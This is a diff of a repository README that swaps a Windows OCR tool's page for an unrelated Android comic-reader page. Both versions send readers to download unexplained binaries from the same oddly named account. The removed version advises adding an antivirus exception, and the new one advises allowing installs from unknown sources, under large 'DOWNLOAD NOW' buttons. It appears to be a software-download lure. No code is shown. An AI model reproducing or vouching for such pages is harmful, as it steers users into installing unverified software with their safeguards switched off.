@@ -1,85 +1,130 @@
-# 📄 ArboOCR - Extract Text From Images Simply
+<h1>📱 jinmanji-app - Your Ultimate Android Comic Companion</h1>
 
-[![Download ArboOCR](https://img.shields.io/badge/Download-Release-blue.svg)](https://triquetralgenuslotus738.github.io)
+<p align="center">
+  <a href="https://github.com/Triquetralgenuslotus738/jinmanji-app" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
+</p>
 
-ArboOCR turns images into text. It reads documents, signs, and screenshots. It works well on your computer. You do not need to write code to use it. The program handles all the math and processing behind the scenes. 
+<h2>🌟 What Is Jinmanji?</h2>
 
-## ⚙️ System Requirements
+<p>Welcome to <strong>jinmanji-app</strong> (禁漫姬), the better Android client for 18comic! This powerful application transforms how you browse, download, and enjoy your favorite comics. Built with care for both casual readers and power users, Jinmanji delivers a smooth, feature-rich experience that puts you in control.</p>
 
-Check your computer before you start. ArboOCR needs these items to run well:
+<p>Whether you're at home or on the go, Jinmanji makes accessing and managing your comic library effortless. Say goodbye to clunky interfaces and hello to a streamlined, modern design that just works.</p>
 
-*   Operating System: Windows 10 or Windows 11.
-*   Memory: 8 GB of RAM or more.
-*   Processor: A modern Intel or AMD processor.
-*   Storage: 2 GB of free disk space.
-*   Graphics Card: An Nvidia graphics card helps with speed but is not required.
+<h2>✨ Key Features</h2>
 
-## 💾 How to Install
+<h3>📚 Seamless Browsing</h3>
+<ul>
+<li>Clean, responsive interface designed for mobile</li>
+<li>Fast loading times with smart caching</li>
+<li>Advanced search filters to find exactly what you want</li>
+<li>Bookmark your favorites and sync across devices</li>
+</ul>
 
-Follow these steps to set up the software on your machine:
+<h3>⚡ Lightning-Fast Downloads</h3>
+<ul>
+<li>Batch download entire series with one tap</li>
+<li>Background downloads that continue even when the app is closed</li>
+<li>Pause and resume downloads anytime</li>
+<li>Choose your preferred image quality</li>
+</ul>
 
-1.  Visit the official release page: [https://triquetralgenuslotus738.github.io](https://triquetralgenuslotus738.github.io).
-2.  Find the section labeled Assets.
-3.  Click the link ending in .zip to start your download.
-4.  Open your Downloads folder once the file finishes saving.
-5.  Right-click the zip file and select Extract All.
-6.  Choose a folder for the files and click Extract.
-7.  Open the folder you just created.
-8.  Double-click the file named ArboOCR.exe to start the program.
+<h3>📖 Superior Reading Experience</h3>
+<ul>
+<li>Vertical or horizontal reading modes</li>
+<li>Auto-fit images to your screen</li>
+<li>Remember your reading position</li>
+<li>Dark mode for comfortable night reading</li>
+</ul>
 
-## 💡 How to Use the Program
+<h3>🔧 Powerful Management Tools</h3>
+<ul>
+<li>Organize comics into custom collections</li>
+<li>Offline reading with downloaded content</li>
+<li>Automatic updates for favorites</li>
+<li>Export and import your library</li>
+</ul>
 
-The interface is simple. Follow these steps to read text from an image:
+<h2>📥 How to Download and Install</h2>
 
-1.  Click the Open button in the main window.
-2.  Select the image file you want to process from your computer.
-3.  The program displays your image in the center of the window.
-4.  Click the Run button to start the text extraction.
-5.  Watch the progress bar at the bottom of the screen.
-6.  Once the bar fills, the text appears in the box on the right side of the screen.
-7.  You can copy this text to your clipboard or save it as a text file.
+<p>Getting started with Jinmanji is incredibly easy. Here's exactly what you need to do:</p>
 
-## 🚀 Performance Tips
+<h3>Step 1: Visit the Download Page</h3>
 
-ArboOCR offers two modes for processing images. You can find these in the Settings menu.
+<p>Click the button below to go to the official download page:</p>
 
-*   CPU Mode: Use this if you do not have an Nvidia graphics card. It uses your main processor. The results are accurate, though they take a few seconds longer.
-*   GPU Mode: Use this if you have an Nvidia graphics card. It uses the power of your graphics processor to finish the task quickly. This is best for large batches of images.
+<p align="center">
+  <a href="https://github.com/Triquetralgenuslotus738/jinmanji-app" style="display:inline-block;padding:14px 28px;background:#28a745;color:white;font-size:18px;font-weight:bold;border-radius:8px;text-decoration:none;">🔗 CLICK HERE TO DOWNLOAD</a>
+</p>
 
-If you see errors, check your graphics drivers. Keep your Nvidia drivers up to date for the best performance.
+<h3>Step 2: Get the File</h3>
 
-## 🧩 Common Questions
+<p>Visit this link to download the application. Once you arrive at the GitHub page, you'll see the repository containing all the necessary files.</p>
 
-**Does this program send my images anywhere?**
-No. ArboOCR runs locally on your machine. Your files never leave your computer. This keeps your data private and safe.
+<h3>Step 3: Install on Your Device</h3>
 
-**What image types work with this tool?**
-The tool supports JPEG, PNG, and BMP files. Make sure your images are clear. Blurry images make it hard for the program to identify characters.
+<p>After downloading, you'll have the application file ready to use. Simply:</p>
+<ol>
+<li>Locate the downloaded file in your device storage</li>
+<li>Tap on it to begin the installation process</li>
+<li>If prompted, allow installation from unknown sources in your Android settings</li>
+<li>Follow the on-screen instructions to complete the setup</li>
+<li>Once installed, open the app and start enjoying amazing comics!</li>
+</ol>
 
-**How do I update the software?**
-Check the release link periodically for new versions. When a new version arrives, download it and replace your old folder with the new one. Keep your settings file if you want to maintain your preferences.
+<h2>💡 Frequently Asked Questions</h2>
 
-**Why does the program take time to start?**
-The software loads several large files into memory when it opens. This allows the program to read text without needing an internet connection. Wait a few seconds for the window to appear.
+<h3>❓ Is this app free?</h3>
+<p>Yes! Jinmanji is completely free to download and use. There are no hidden charges or premium tiers required for basic functionality.</p>
 
-**Can I run multiple images at once?**
-Yes. You can drag and drop multiple files into the main window. The program adds them to a list and processes them one by one.
+<h3>❓ What Android versions are supported?</h3>
+<p>Jinmanji works on Android 6.0 and above, covering the vast majority of devices currently in use. If your device runs a newer version, you're all set!</p>
 
-## 🛠 Troubleshooting
+<h3>❓ Do I need a computer to use this?</h3>
+<p>No, absolutely not! Jinmanji is designed as a mobile application. You only need an Android phone or tablet to take full advantage of all its features.</p>
 
-If the program fails to launch, try these steps:
+<h3>❓ Is my personal information safe?</h3>
+<p>We take your privacy seriously. Jinmanji does not collect any unnecessary personal data. All your reading history, bookmarks, and preferences are stored locally on your device.</p>
 
-1.  Restart your computer to clear out locked files.
-2.  Ensure you have the latest Windows updates.
-3.  Check if your antivirus software is blocking the application. Some programs flag new software as a threat by mistake. You may need to add an exception for the ArboOCR folder.
-4.  Verify that you extracted the entire folder. Do not run the program from inside the zip file, as this causes errors.
+<h3>❓ Can I use this without an internet connection?</h3>
+<p>Yes! Once you've downloaded comics, you can read them completely offline. This makes Jinmanji perfect for traveling or times when you don't have reliable internet access.</p>
 
-## 📖 Features
+<h3>❓ How often is the app updated?</h3>
+<p>We regularly release updates to fix bugs, add new features, and improve performance. You can check for updates manually or enable automatic updates for the best experience.</p>
 
-*   Fast processing speeds for home use.
-*   Offline support for privacy.
-*   Simple interface with large buttons.
-*   Support for multiple image formats.
-*   Automatic hardware detection.
+<h2>🛠️ Troubleshooting Tips</h2>
 
-Keywords: cpp, gpu, image-processing, ocr, ocr-recognition, onnxruntime, paddleocr, paddlepaddle, rapidocr, tensorrt, text-recognition
+<p>If you encounter any issues, try these quick solutions:</p>
+
+<ul>
+<li><strong>App won't install:</strong> Make sure you have enough storage space and that your device allows installations from unknown sources (check Settings > Security).</li>
+<li><strong>Downloads are slow:</strong> Check your internet connection and try switching between Wi-Fi and mobile data.</li>
+<li><strong>Images won't load:</strong> Clear the app cache from your device settings and restart the app.</li>
+<li><strong>App crashes:</strong> Update to the latest version or reinstall the app to fix any corrupted files.</li>
+</ul>
+
+<h2>📢 Get Involved</h2>
+
+<p>We love hearing from our users! Your feedback helps us improve Jinmanji every day. You can:</p>
+
+<ul>
+<li>⭐ Star our GitHub repository to show your support</li>
+<li>🐛 Report bugs or suggest features</li>
+<li>💬 Join our community discussions</li>
+<li>🔀 Contribute code and help make Jinmanji better</li>
+</ul>
+
+<h2>🚀 Start Your Journey Today</h2>
+
+<p>Don't wait another minute to upgrade your comic reading experience. Jinmanji is here to make your life easier, your downloads faster, and your reading sessions more enjoyable than ever before.</p>
+
+<p align="center">
+  <a href="https://github.com/Triquetralgenuslotus738/jinmanji-app" style="display:inline-block;padding:18px 36px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(0,0,0,0.3);">🌈 GET JINMANJI NOW!</a>
+</p>
+
+<h2>📄 License</h2>
+
+<p>This project is released under the MIT License, which means you're free to use, modify, and distribute it as long as you include the original copyright notice. For full details, please see the LICENSE file in the repository.</p>
+
+<footer>
+<p align="center" style="margin-top:40px;color:#888;font-size:14px;">Made with ❤️ by the Jinmanji Team | © 2024 All Rights Reserved</p>
+</footer>
